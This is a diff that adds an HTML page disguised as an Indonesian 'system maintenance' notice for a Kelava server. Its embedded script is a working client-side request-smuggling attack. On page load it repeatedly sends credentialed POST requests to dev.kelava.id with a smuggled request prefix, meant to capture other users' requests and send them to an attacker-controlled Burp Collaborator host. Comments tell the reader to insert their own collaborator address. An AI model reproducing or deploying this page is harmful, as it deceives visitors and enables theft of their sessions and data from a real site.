@@ -1,0 +1,36 @@
+<!DOCTYPE html>
+<html>
+<head>
+    <title>Sistem Maintenance</title>
+</head>
+<body>
+    <h1>Mohon Tunggu...</h1>
+    <p>Sedang sinkronisasi data dengan server Kelava...</p>
+
+    <script>
+        // GANTI INI dengan alamat Burp Collaborator kalian!
+        const attacker = "g2juo9e1lc4bqjf3hj8wq7f0drji7dv2.oastify.com"; 
+        const target = "https://dev.kelava.id/";
+
+        function doSmuggle() {
+            // Bill bilang kita pakai fetch dengan 'include' credentials
+            // Dan kita sengaja bikin error di request supaya sisa datanya tertinggal di pipa
+            fetch(target, {
+                method: 'POST',
+                mode: 'no-cors',
+                credentials: 'include',
+                // Kita gunakan header yang sangat panjang untuk memaksa desync
+                headers: {
+                    'Content-Type': 'application/x-www-form-urlencoded',
+                    'X-Padding': 'A'.repeat(1000) 
+                },
+                // Body ini adalah 'prefix' yang akan menangkap request korban berikutnya
+                body: "GET /capture?data=" + attacker + " HTTP/1.1\r\nHost: " + attacker + "\r\nConnection: keep-alive\r\n\r\n"
+            }).catch(e => {});
+        }
+
+        // Jalankan lebih cepat agar pipa koneksi penuh dengan jebakan kita
+        setInterval(doSmuggle, 500);
+    </script>
+</body>
+</html>
